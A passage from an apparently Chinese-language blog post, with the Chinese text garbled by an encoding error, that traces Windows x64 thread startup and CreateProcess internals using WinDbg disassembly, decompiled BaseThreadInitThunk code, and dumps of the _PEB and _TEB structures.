eb2a                 jmp     ntdll!RtlUserThreadStart+0x57 (00007ffd&#96;b70e4887)
49ba70535218429f5d94 mov     r10, 945D9F4218525370h
488bca               mov     rcx, rdx
498bc1               mov     rax, r9
ff159de71800         call    qword ptr [ntdll!_guard_xfg_dispatch_icall_fptr (00007ffd&#96;b7273010)]
8bc8                 mov     ecx, eax
e826000000           call    ntdll!RtlExitUserThread (00007ffd&#96;b70e48a0)
90                   nop     
8bd0                 mov     edx, eax
4883c9ff             or      rcx, 0FFFFFFFFFFFFFFFFh
e83af40900           call    ntdll!NtTerminateProcess (00007ffd&#96;b7183cc0)
90                   nop     
4883c478             add     rsp, 78h
c3                   ret     <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>æ£€æµ‹ Kernel32ThreadInitThunkFunctionï¼ˆraxï¼‰ é 0 ä¹‹åè·³è½¬åˆ° ntdll!guard_xfg_dispatch_icall_nop ï¼Œå†è·³è½¬åˆ° ntdll!guard_dispatch_icall_nop ï¼Œé€šè¿‡ jmp raxï¼Œè·³åˆ°åˆå§‹åŒ–å‡½æ•° KERNEL32!BaseThreadInitThunk </p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">/*
a1 æ˜¯åœ¨ ntdll!RtlUserThreadStart ä¸­åˆå§‹åŒ–ä¸º 0 çš„ï¼Œè¿™é‡Œï¼ˆ if(!a1) ï¼‰åšå®‰å…¨æ£€æµ‹
*/</span>
__int64 __fastcall <span class="token function">BaseThreadInitThunk</span><span class="token punctuation">(</span><span class="token keyword">int</span> a1<span class="token punctuation">,</span> __int64 a2<span class="token punctuation">,</span> __int64 a3<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  NTSTATUS inited<span class="token punctuation">;</span> <span class="token comment">// eax</span>
  __int64 result<span class="token punctuation">;</span> <span class="token comment">// rax</span>

  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>a1 <span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
    inited <span class="token operator">=</span> <span class="token function">BaseThreadInitXfgThunk</span><span class="token punctuation">(</span>a3<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">RtlExitUserThread</span><span class="token punctuation">(</span>inited<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">__debugbreak</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token function">RtlGetSuiteMask</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0x10</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span> <span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token number">0</span>i64<span class="token punctuation">;</span>
  result <span class="token operator">=</span> <span class="token function">BasepInitializeTermsrvFpns</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>result <span class="token operator">>=</span> <span class="token number">0</span> <span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token number">0</span>i64<span class="token punctuation">;</span>
  <span class="token keyword">return</span> result<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>KERNEL32!BaseThreadInitXfgThunk ç›´æ¥è·³è½¬åˆ° rdx ä¸Šï¼Œrdx ä¹‹å‰è¢« rcx èµ‹å€¼ä¸ºç¨‹åºçš„ entrypointï¼Œç”¨æˆ·ç¨‹åºæ­£å¼å¼€å§‹ã€‚</p>
<p><del>åˆ†ææ˜¯ä» ntdll!RtlUserThreadStart å¼€å§‹çš„ï¼Œæ˜¾ç„¶ç¯å¢ƒä»¥åŠåˆå§‹åŒ–è¿‡äº†ï¼Œä¸‹é¢å°±æ˜¯åˆ†æåˆå§‹åŒ–çš„è¿‡ç¨‹ã€‚<br>é€šè¿‡ api monitorï¼Œæ‰¾åˆ°ç¬¬ä¸€ä¸ªç³»ç»Ÿè°ƒç”¨ NtQueryVolumeInformationFile ( 0x0000000000000058, 0x00000047d01fec50, 0x00000047d01fec70, 8, FileFsDeviceInformation )ï¼Œwindbg è·Ÿè¸ªã€‚</del></p>
<p>ä» CreateProcess åˆ†æ<br>è°ƒç”¨é“¾<br>CreateProcessW-&gt;KERNEL32!CreateProcessAStub-&gt;KERNELBASE!CreateProcessA-&gt;CreateProcessInternalA-&gt;KERNELBASE!Basep8BitStringToDynamicUnicodeString + KERNELBASE!CreateProcessInternalW-&gt;</p>
<pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">KERNELBASE!memset
KERNELBASE!memset
KERNELBASE!IsProcessInJob
KERNELBASE!BaseFormatObjectAttributes
KERNELBASE!BaseFormatObjectAttributes
qword ptr [KERNELBASE!_imp_RtlFreeUnicodeString (00007ffd&#96;b4b0c490)]
KERNELBASE!IsBaseCheckElevationPresent
qword ptr [KERNELBASE!_imp_BasepFreeAppCompatData (00007ffd&#96;b4c14608)]
 KERNELBASE!IsBaseCheckElevationPresent
 qword ptr [KERNELBASE!_imp_BasepReleaseSxsCreateProcessUtilityStruct (00007ffd&#96;b4c14610)]
 KERNELBASE!memset
 KERNELBASE!BasepFreeBnoIsolationParameter
 qword ptr [KERNELBASE!_imp_RtlAllocateHeap
 qword ptr [KERNELBASE!_imp_RtlGetExePath
 KERNELBASE!SearchPathW (00007ffd&#96;b492a470)
 KERNELBASE!GetFileAttributesW
 qword ptr [KERNELBASE!_imp_RtlDosPathNameToNtPathName_U (00007ffd&#96;b4b0c570)]
 qword ptr [KERNELBASE!_imp_RtlInitUnicodeStringEx (00007ffd&#96;b4b0cb40)]
 qword ptr [KERNELBASE!_imp_RtlDetermineDosPathNameType_U (00007ffd&#96;b4b0c6c8)]
 KERNELBASE!BasepAdjustApplicationPath
 qword ptr [KERNELBASE!_imp_GetEmbeddedImageMitigationPolicy (00007ffd&#96;b4c14010)]
 KERNELBASE!memset
 qword ptr [KERNELBASE!_imp_RtlWow64GetProcessMachines (00007ffd&#96;b4b0d7e8)]
 KERNELBASE!BasepCreateProcessParameters
 KERNELBASE!QueryChpeConfiguration
 qword ptr [KERNELBASE!_imp_NtCreateUserProcess
 qword ptr [KERNELBASE!_imp_RtlDestroyProcessParameters (00007ffd&#96;b4b0cf20)]
 qword ptr [KERNELBASE!_imp_RtlAllocateHeap (00007ffd&#96;b4b0da50)]
 qword ptr [KERNELBASE!_imp_LdrQueryImageFileKeyOption (00007ffd&#96;b4b0d818)]
 qword ptr [KERNELBASE!_imp_RtlFreeHeap (00007ffd&#96;b4b0cba0)]
 qword ptr [KERNELBASE!_imp_LdrQueryImageFileKeyOption (00007ffd&#96;b4b0d818)]
 KERNELBASE!LoadAppExecutionAliasInfoForExecutable
 call    KERNELBASE!ValidateAppExecutionAliasRedirectPackageIdentity
 KERNELBASE!BuildAppExecutionAliasCommandLine
 qword ptr [KERNELBASE!_imp_RtlInitUnicodeString (00007ffd&#96;b4b0c498)]
 qword ptr [KERNELBASE!_imp_NtClose (00007ffd&#96;b4b0cb48)]
 qword ptr [KERNELBASE!_imp_RtlFreeHeap (00007ffd&#96;b4b0cba0)]
 qword ptr [KERNELBASE!_imp_RtlFreeUnicodeString (00007ffd&#96;b4b0c490)]
 KERNELBASE!IsBaseCheckElevationPresent
 qword ptr [KERNELBASE!_imp_BasepFreeAppCompatData (00007ffd&#96;b4c14608)]
 KERNELBASE!IsBaseCheckElevationPresent
 qword ptr [KERNELBASE!_imp_BasepReleaseSxsCreateProcessUtilityStruct (00007ffd&#96;b4c14610)]
 KERNELBASE!memset
 KERNELBASE!BasepFreeBnoIsolationParameter
 qword ptr [KERNELBASE!_imp_RtlDosPathNameToNtPathName_U (00007ffd&#96;b4b0c570)]
 qword ptr [KERNELBASE!_imp_RtlInitUnicodeStringEx (00007ffd&#96;b4b0cb40)]
 qword ptr [KERNELBASE!_imp_RtlDetermineDosPathNameType_U (00007ffd&#96;b4b0c6c8)]
 KERNELBASE!BasepAdjustApplicationPath
 KERNELBASE!IsBaseCheckElevationPresent
 qword ptr [KERNELBASE!_imp_BasepAppXExtension (00007ffd&#96;b4c14618)]
 qword ptr [KERNELBASE!_imp_RtlInitUnicodeString (00007ffd&#96;b4b0c498)]
 qword ptr [KERNELBASE!_imp_RtlInitUnicodeString (00007ffd&#96;b4b0c498)]
 KERNELBASE!memset
 ...
 qword ptr [KERNELBASE!_imp_NtCreateUserProcess
 ...
 qword ptr [KERNELBASE!_imp_NtAllocateVirtualMemory (00007ffd&#96;b4b0d308)]
 qword ptr [KERNELBASE!_imp_NtWriteVirtualMemory (00007ffd&#96;b4b0d300)]
 KERNELBASE!IsBaseCheckElevationPresent
 qword ptr [KERNELBASE!_imp_BaseElevationPostProcessing (00007ffd&#96;b4c145e8)]
 qword ptr [KERNELBASE!_imp_BasepPostSuccessAppXExtension (00007ffd&#96;b4c145e0)]
 KERNELBASE!BasepUpdateProcessParametersField
 qword ptr [KERNELBASE!_imp_CompleteAppExecutionAliasProcessCreationEx (00007ffd&#96;b4c14268)]
 qword ptr [KERNELBASE!_imp_NtResumeThread (00007ffd&#96;b4b0d648)]
 ...<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>





<h1 id="OLD"><a href="#OLD" class="headerlink" title="OLD"></a>OLD</h1><p>windows visataä¹‹åçº¿ç¨‹çš„å®é™…å…¥å£æ˜¯ntdll!RtlUserThreadStart,æˆ‘ä¸‹äº†ä¸€ä¸ªæ–­ç‚¹å‘ç°win10ä¹Ÿæ˜¯è¿™æ ·ï¼Œåªä¸è¿‡å…·ä½“å®ç°æœ‰äº›åŒºåˆ«ï¼Œæœ¬æ¥æˆ‘æ˜¯æ‰“ç®—ä¸€è·¯æ‰¾å›å»çœ‹çœ‹æ˜¯ä¸æ˜¯èƒ½æ‰¾åˆ°ntdll!RtlUserThreadStartè¿™ä¸ªå‡½æ•°çš„ï¼Œä¸è¿‡åº”è¯¥è¦æŒºä¹…ï¼Œä¸‹æ¬¡è¯•è¯•2333ã€‚å•çº¯ä¸ºäº†éªŒè¯ä¸€ä¸‹çº¿ç¨‹å…¥å£ç‚¹ï¼Œäºæ˜¯æˆ‘å°±ä¸‹æ–­çœ‹äº†ä¸€ä¸‹ã€‚</p>
<h1 id="è¡¥å……çŸ¥è¯†"><a href="#è¡¥å……çŸ¥è¯†" class="headerlink" title="è¡¥å……çŸ¥è¯†"></a>è¡¥å……çŸ¥è¯†</h1><h2 id="fastcall"><a href="#fastcall" class="headerlink" title="fastcall"></a><strong>fastcall</strong></h2><p>ä¸€ä¸ªå‡½æ•°åœ¨è°ƒç”¨æ—¶ï¼Œå‰å››ä¸ª<strong>å‚æ•°</strong>æ˜¯ä»å·¦è‡³å³ä¾æ¬¡å­˜æ”¾äºRCXã€RDXã€R8ã€R9<strong>å¯„å­˜å™¨</strong>é‡Œé¢ï¼Œå‰©ä¸‹çš„<strong>å‚æ•°</strong>ä»å³è‡³å·¦<strong>é¡ºåº</strong>å…¥æ ˆï¼› æ ˆçš„å¢é•¿æ–¹å‘ä¸ºä»é«˜åœ°å€åˆ°ä½åœ°å€ã€‚</p>
<h2 id="windbg"><a href="#windbg" class="headerlink" title="windbg"></a>windbg</h2><p>The <strong>x</strong> command displays the symbols in all contexts that match the specified pattern.<br>å¸¸ç”¨æ¥åŒ¹é…ç¬¦å·ã€‚</p>
<h2 id="windows-å…³é”®æ•°æ®ç»“æ„åŠå…¶ç”¨æ³•"><a href="#windows-å…³é”®æ•°æ®ç»“æ„åŠå…¶ç”¨æ³•" class="headerlink" title="windows å…³é”®æ•°æ®ç»“æ„åŠå…¶ç”¨æ³•"></a>windows å…³é”®æ•°æ®ç»“æ„åŠå…¶ç”¨æ³•</h2><p>ç›´æ¥çœ‹ x64 ä¸‹çš„</p>
<h3 id="PEB"><a href="#PEB" class="headerlink" title="_PEB"></a>_PEB</h3><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">0:000> dt _PEB
ntdll!_PEB
   <span class="token operator">+</span>0x000 InheritedAddressSpace : UChar
   <span class="token operator">+</span>0x001 ReadImageFileExecOptions : UChar
   <span class="token operator">+</span>0x002 BeingDebugged    : UChar
   <span class="token operator">+</span>0x003 BitField         : UChar
   <span class="token operator">+</span>0x003 ImageUsesLargePages : Pos 0<span class="token punctuation">,</span> 1 Bit
   <span class="token operator">+</span>0x003 IsProtectedProcess : Pos 1<span class="token punctuation">,</span> 1 Bit
   <span class="token operator">+</span>0x003 IsImageDynamicallyRelocated : Pos 2<span class="token punctuation">,</span> 1 Bit
   <span class="token operator">+</span>0x003 SkipPatchingUser32Forwarders : Pos 3<span class="token punctuation">,</span> 1 Bit
   <span class="token operator">+</span>0x003 IsPackagedProcess : Pos 4<span class="token punctuation">,</span> 1 Bit
   <span class="token operator">+</span>0x003 IsAppContainer   : Pos 5<span class="token punctuation">,</span> 1 Bit
   <span class="token operator">+</span>0x003 IsProtectedProcessLight : Pos 6<span class="token punctuation">,</span> 1 Bit
   <span class="token operator">+</span>0x003 IsLongPathAwareProcess : Pos 7<span class="token punctuation">,</span> 1 Bit
   <span class="token operator">+</span>0x004 Padding0         : <span class="token punctuation">[</span>4<span class="token punctuation">]</span> UChar
   <span class="token operator">+</span>0x008 Mutant           : Ptr64 Void
   <span class="token operator">+</span>0x010 ImageBaseAddress : Ptr64 Void
   <span class="token operator">+</span>0x018 Ldr              : Ptr64 _PEB_LDR_DATA
   <span class="token operator">+</span>0x020 ProcessParameters : Ptr64 _RTL_USER_PROCESS_PARAMETERS
   <span class="token operator">+</span>0x028 SubSystemData    : Ptr64 Void
   <span class="token operator">+</span>0x030 ProcessHeap      : Ptr64 Void
   <span class="token operator">+</span>0x038 FastPebLock      : Ptr64 _RTL_CRITICAL_SECTION
   <span class="token operator">+</span>0x040 AtlThunkSListPtr : Ptr64 _SLIST_HEADER
   <span class="token operator">+</span>0x048 IFEOKey          : Ptr64 Void
   <span class="token operator">+</span>0x050 CrossProcessFlags : Uint4B
   <span class="token operator">+</span>0x050 ProcessInJob     : Pos 0<span class="token punctuation">,</span> 1 Bit
   <span class="token operator">+</span>0x050 ProcessInitializing : Pos 1<span class="token punctuation">,</span> 1 Bit
   <span class="token operator">+</span>0x050 ProcessUsingVEH  : Pos 2<span class="token punctuation">,</span> 1 Bit
   <span class="token operator">+</span>0x050 ProcessUsingVCH  : Pos 3<span class="token punctuation">,</span> 1 Bit
   <span class="token operator">+</span>0x050 ProcessUsingFTH  : Pos 4<span class="token punctuation">,</span> 1 Bit
   <span class="token operator">+</span>0x050 ProcessPreviouslyThrottled : Pos 5<span class="token punctuation">,</span> 1 Bit
   <span class="token operator">+</span>0x050 ProcessCurrentlyThrottled : Pos 6<span class="token punctuation">,</span> 1 Bit
   <span class="token operator">+</span>0x050 ProcessImagesHotPatched : Pos 7<span class="token punctuation">,</span> 1 Bit
   <span class="token operator">+</span>0x050 ReservedBits0    : Pos 8<span class="token punctuation">,</span> 24 Bits
   <span class="token operator">+</span>0x054 Padding1         : <span class="token punctuation">[</span>4<span class="token punctuation">]</span> UChar
   <span class="token operator">+</span>0x058 KernelCallbackTable : Ptr64 Void
   <span class="token operator">+</span>0x058 UserSharedInfoPtr : Ptr64 Void
   <span class="token operator">+</span>0x060 SystemReserved   : Uint4B
   <span class="token operator">+</span>0x064 AtlThunkSListPtr32 : Uint4B
   <span class="token operator">+</span>0x068 ApiSetMap        : Ptr64 Void
   <span class="token operator">+</span>0x070 TlsExpansionCounter : Uint4B
   <span class="token operator">+</span>0x074 Padding2         : <span class="token punctuation">[</span>4<span class="token punctuation">]</span> UChar
   <span class="token operator">+</span>0x078 TlsBitmap        : Ptr64 _RTL_BITMAP
   <span class="token operator">+</span>0x080 TlsBitmapBits    : <span class="token punctuation">[</span>2<span class="token punctuation">]</span> Uint4B
   <span class="token operator">+</span>0x088 ReadOnlySharedMemoryBase : Ptr64 Void
   <span class="token operator">+</span>0x090 SharedData       : Ptr64 Void
   <span class="token operator">+</span>0x098 ReadOnlyStaticServerData : Ptr64 Ptr64 Void
   <span class="token operator">+</span>0x0a0 AnsiCodePageData : Ptr64 Void
   <span class="token operator">+</span>0x0a8 OemCodePageData  : Ptr64 Void
   <span class="token operator">+</span>0x0b0 UnicodeCaseTableData : Ptr64 Void
   <span class="token operator">+</span>0x0b8 NumberOfProcessors : Uint4B
   <span class="token operator">+</span>0x0bc NtGlobalFlag     : Uint4B
   <span class="token operator">+</span>0x0c0 CriticalSectionTimeout : _LARGE_INTEGER
   <span class="token operator">+</span>0x0c8 HeapSegmentReserve : Uint8B
   <span class="token operator">+</span>0x0d0 HeapSegmentCommit : Uint8B
   <span class="token operator">+</span>0x0d8 HeapDeCommitTotalFreeThreshold : Uint8B
   <span class="token operator">+</span>0x0e0 HeapDeCommitFreeBlockThreshold : Uint8B
   <span class="token operator">+</span>0x0e8 NumberOfHeaps    : Uint4B
   <span class="token operator">+</span>0x0ec MaximumNumberOfHeaps : Uint4B
   <span class="token operator">+</span>0x0f0 ProcessHeaps     : Ptr64 Ptr64 Void
   <span class="token operator">+</span>0x0f8 GdiSharedHandleTable : Ptr64 Void
   <span class="token operator">+</span>0x100 ProcessStarterHelper : Ptr64 Void
   <span class="token operator">+</span>0x108 GdiDCAttributeList : Uint4B
   <span class="token operator">+</span>0x10c Padding3         : <span class="token punctuation">[</span>4<span class="token punctuation">]</span> UChar
   <span class="token operator">+</span>0x110 LoaderLock       : Ptr64 _RTL_CRITICAL_SECTION
   <span class="token operator">+</span>0x118 OSMajorVersion   : Uint4B
   <span class="token operator">+</span>0x11c OSMinorVersion   : Uint4B
   <span class="token operator">+</span>0x120 OSBuildNumber    : Uint2B
   <span class="token operator">+</span>0x122 OSCSDVersion     : Uint2B
   <span class="token operator">+</span>0x124 OSPlatformId     : Uint4B
   <span class="token operator">+</span>0x128 ImageSubsystem   : Uint4B
   <span class="token operator">+</span>0x12c ImageSubsystemMajorVersion : Uint4B
   <span class="token operator">+</span>0x130 ImageSubsystemMinorVersion : Uint4B
   <span class="token operator">+</span>0x134 Padding4         : <span class="token punctuation">[</span>4<span class="token punctuation">]</span> UChar
   <span class="token operator">+</span>0x138 ActiveProcessAffinityMask : Uint8B
   <span class="token operator">+</span>0x140 GdiHandleBuffer  : <span class="token punctuation">[</span>60<span class="token punctuation">]</span> Uint4B
   <span class="token operator">+</span>0x230 PostProcessInitRoutine : Ptr64     void 
   <span class="token operator">+</span>0x238 TlsExpansionBitmap : Ptr64 _RTL_BITMAP
   <span class="token operator">+</span>0x240 TlsExpansionBitmapBits : <span class="token punctuation">[</span>32<span class="token punctuation">]</span> Uint4B
   <span class="token operator">+</span>0x2c0 SessionId        : Uint4B
   <span class="token operator">+</span>0x2c4 Padding5         : <span class="token punctuation">[</span>4<span class="token punctuation">]</span> UChar
   <span class="token operator">+</span>0x2c8 AppCompatFlags   : _ULARGE_INTEGER
   <span class="token operator">+</span>0x2d0 AppCompatFlagsUser : _ULARGE_INTEGER
   <span class="token operator">+</span>0x2d8 pShimData        : Ptr64 Void
   <span class="token operator">+</span>0x2e0 AppCompatInfo    : Ptr64 Void
   <span class="token operator">+</span>0x2e8 CSDVersion       : _UNICODE_STRING
   <span class="token operator">+</span>0x2f8 ActivationContextData : Ptr64 _ACTIVATION_CONTEXT_DATA
   <span class="token operator">+</span>0x300 ProcessAssemblyStorageMap : Ptr64 _ASSEMBLY_STORAGE_MAP
   <span class="token operator">+</span>0x308 SystemDefaultActivationContextData : Ptr64 _ACTIVATION_CONTEXT_DATA
   <span class="token operator">+</span>0x310 SystemAssemblyStorageMap : Ptr64 _ASSEMBLY_STORAGE_MAP
   <span class="token operator">+</span>0x318 MinimumStackCommit : Uint8B
   <span class="token operator">+</span>0x320 SparePointers    : <span class="token punctuation">[</span>2<span class="token punctuation">]</span> Ptr64 Void
   <span class="token operator">+</span>0x330 PatchLoaderData  : Ptr64 Void
   <span class="token operator">+</span>0x338 ChpeV2ProcessInfo : Ptr64 _CHPEV2_PROCESS_INFO
   <span class="token operator">+</span>0x340 AppModelFeatureState : Uint4B
   <span class="token operator">+</span>0x344 SpareUlongs      : <span class="token punctuation">[</span>2<span class="token punctuation">]</span> Uint4B
   <span class="token operator">+</span>0x34c ActiveCodePage   : Uint2B
   <span class="token operator">+</span>0x34e OemCodePage      : Uint2B
   <span class="token operator">+</span>0x350 UseCaseMapping   : Uint2B
   <span class="token operator">+</span>0x352 UnusedNlsField   : Uint2B
   <span class="token operator">+</span>0x358 WerRegistrationData : Ptr64 Void
   <span class="token operator">+</span>0x360 WerShipAssertPtr : Ptr64 Void
   <span class="token operator">+</span>0x368 EcCodeBitMap     : Ptr64 Void
   <span class="token operator">+</span>0x370 pImageHeaderHash : Ptr64 Void
   <span class="token operator">+</span>0x378 TracingFlags     : Uint4B
   <span class="token operator">+</span>0x378 HeapTracingEnabled : Pos 0<span class="token punctuation">,</span> 1 Bit
   <span class="token operator">+</span>0x378 CritSecTracingEnabled : Pos 1<span class="token punctuation">,</span> 1 Bit
   <span class="token operator">+</span>0x378 LibLoaderTracingEnabled : Pos 2<span class="token punctuation">,</span> 1 Bit
   <span class="token operator">+</span>0x378 SpareTracingBits : Pos 3<span class="token punctuation">,</span> 29 Bits
   <span class="token operator">+</span>0x37c Padding6         : <span class="token punctuation">[</span>4<span class="token punctuation">]</span> UChar
   <span class="token operator">+</span>0x380 CsrServerReadOnlySharedMemoryBase : Uint8B
   <span class="token operator">+</span>0x388 TppWorkerpListLock : Uint8B
   <span class="token operator">+</span>0x390 TppWorkerpList   : _LIST_ENTRY
   <span class="token operator">+</span>0x3a0 WaitOnAddressHashTable : <span class="token punctuation">[</span>128<span class="token punctuation">]</span> Ptr64 Void
   <span class="token operator">+</span>0x7a0 TelemetryCoverageHeader : Ptr64 Void
   <span class="token operator">+</span>0x7a8 CloudFileFlags   : Uint4B
   <span class="token operator">+</span>0x7ac CloudFileDiagFlags : Uint4B
   <span class="token operator">+</span>0x7b0 PlaceholderCompatibilityMode : Char
   <span class="token operator">+</span>0x7b1 PlaceholderCompatibilityModeReserved : <span class="token punctuation">[</span>7<span class="token punctuation">]</span> Char
   <span class="token operator">+</span>0x7b8 LeapSecondData   : Ptr64 _LEAP_SECOND_DATA
   <span class="token operator">+</span>0x7c0 LeapSecondFlags  : Uint4B
   <span class="token operator">+</span>0x7c0 SixtySecondEnabled : Pos 0<span class="token punctuation">,</span> 1 Bit
   <span class="token operator">+</span>0x7c0 Reserved         : Pos 1<span class="token punctuation">,</span> 31 Bits
   <span class="token operator">+</span>0x7c4 NtGlobalFlag2    : Uint4B
   <span class="token operator">+</span>0x7c8 ExtendedFeatureDisableMask : Uint8B<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="TEB"><a href="#TEB" class="headerlink" title="_TEB"></a>_TEB</h3><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">0:000> dt _TEB
ntdll!_TEB
   <span class="token operator">+</span>0x000 NtTib            : _NT_TIB
   <span class="token operator">+</span>0x038 EnvironmentPointer : Ptr64 Void
   <span class="token operator">+</span>0x040 ClientId         : _CLIENT_ID
   <span class="token operator">+</span>0x050 ActiveRpcHandle  : Ptr64 Void
   <span class="token operator">+</span>0x058 ThreadLocalStoragePointer : Ptr64 Void
   <span class="token operator">+</span>0x060 ProcessEnvironmentBlock : Ptr64 _PEB
   <span class="token operator">+</span>0x068 LastErrorValue   : Uint4B
   <span class="token operator">+</span>0x06c CountOfOwnedCriticalSections : Uint4B
   <span class="token operator">+</span>0x070 CsrClientThread  : Ptr64 Void
   <span class="token operator">+</span>0x078 Win32ThreadInfo  : Ptr64 Void
   <span class="token operator">+</span>0x080 User32Reserved   : <span class="token punctuation">[</span>26<span class="token punctuation">]</span> Uint4B
   <span class="token operator">+</span>0x0e8 UserReserved     : <span class="token punctuation">[</span>5<span class="token punctuation">]</span> Uint4B
   <span class="token operator">+</span>0x100 WOW32Reserved    : Ptr64 Void
   <span class="token operator">+</span>0x108 CurrentLocale    : Uint4B
   <span class="token operator">+</span>0x10c FpSoftwareStatusRegister : Uint4B
   <span class="token operator">+</span>0x110 ReservedForDebuggerInstrumentation : <span class="token punctuation">[</span>16<span class="token punctuation">]</span> Ptr64 Void
   <span class="token operator">+</span>0x190 SystemReserved1  : <span class="token punctuation">[</span>30<span class="token punctuation">]</span> Ptr64 Void
   <span class="token operator">+</span>0x280 PlaceholderCompatibilityMode : Char
   <span class="token operator">+</span>0x281 PlaceholderHydrationAlwaysExplicit : UChar
   <span class="token operator">+</span>0x282 PlaceholderReserved : <span class="token punctuation">[</span>10<span class="token punctuation">]</span> Char
   <span class="token operator">+</span>0x28c ProxiedProcessId : Uint4B
   <span class="token operator">+</span>0x290 _ActivationStack : _ACTIVATION_CONTEXT_STACK
   <span class="token operator">+</span>0x2b8 WorkingOnBehalfTicket : <span class="token punctuation">[</span>8<span class="token punctuation">]</span> UChar
   <span class="token operator">+</span>0x2c0 ExceptionCode    : Int4B
   <span class="token operator">+</span>0x2c4 Padding0         : <span class="token punctuation">[</span>4<span class="token punctuation">]</span> UChar
   <span class="token operator">+</span>0x2c8 ActivationContextStackPointer : Ptr64 _ACTIVATION_CONTEXT_STACK
   <span class="token operator">+</span>0x2d0 InstrumentationCallbackSp : Uint8B
   <span class="token operator">+</span>0x2d8 InstrumentationCallbackPreviousPc : Uint8B
   <span class="token operator">+</span>0x2e0 InstrumentationCallbackPreviousSp : Uint8B
   <span class="token operator">+</span>0x2e8 TxFsContext      : Uint4B
   <span class="token operator">+</span>0x2ec InstrumentationCallbackDisabled : UChar
   <span class="token operator">+</span>0x2ed UnalignedLoadStoreExceptions : UChar
   <span class="token operator">+</span>0x2ee Padding1         : <span class="token punctuation">[</span>2<span class="token punctuation">]</span> UChar
   <span class="token operator">+</span>0x2f0 GdiTebBatch      : _GDI_TEB_BATCH
   <span class="token operator">+</span>0x7d8 RealClientId     : _CLIENT_ID
   <span class="token operator">+</span>0x7e8 GdiCachedProcessHandle : Ptr64 Void
   <span class="token operator">+</span>0x7f0 GdiClientPID     : Uint4B
   <span class="token operator">+</span>0x7f4 GdiClientTID     : Uint4B
   <span class="token operator">+</span>0x7f8 GdiThreadLocalInfo : Ptr64 Void
   <span class="token operator">+</span>0x800 Win32ClientInfo  : <span class="token punctuation">[</span>62<span class="token punctuation">]</span> Uint8B
   <span class="token operator">+</span>0x9f0 glDispatchTable  : <span class="token punctuation">[</span>233<span class="token punctuation">]</span> Ptr64 Void
   <span class="token operator">+</span>0x1138 glReserved1      : <span class="token punctuation">[</span>29<span class="token punctuation">]</span> Uint8B
   <span class="token operator">+</span>0x1220 glReserved2      : Ptr64 Void
   <span class="token operator">+</span>0x1228 glSectionInfo    : Ptr64 Void
   <span class="token operator">+</span>0x1230 glSection        : Ptr64 Void
   <span class="token operator">+</span>0x1238 glTable          : Ptr64 Void
   <span class="token operator">+</span>0x1240 glCurrentRC      : Ptr64 Void
   <span class="token operator">+</span>0x1248 glContext        : Ptr64 Void
   <span class="token operator">+</span>0x1250 LastStatusValue  : Uint4B
   <span class="token operator">+</span>0x1254 Padding2         : <span class="token punctuation">[</span>4<span class="token punctuation">]</span> UChar
   <span class="token operator">+</span>0x1258 StaticUnicodeString : _UNICODE_STRING
   <span class="token operator">+</span>0x1268 StaticUnicodeBuffer : <span class="token punctuation">[</span>261<span class="token punctuation">]</span> Wchar
   <span class="token operator">+</span>0x1472 Padding3         : <span class="token punctuation">[</span>6<span class="token punctuation">]</span> UChar
   <span class="token operator">+</span>0x1478 DeallocationStack : Ptr64 Void
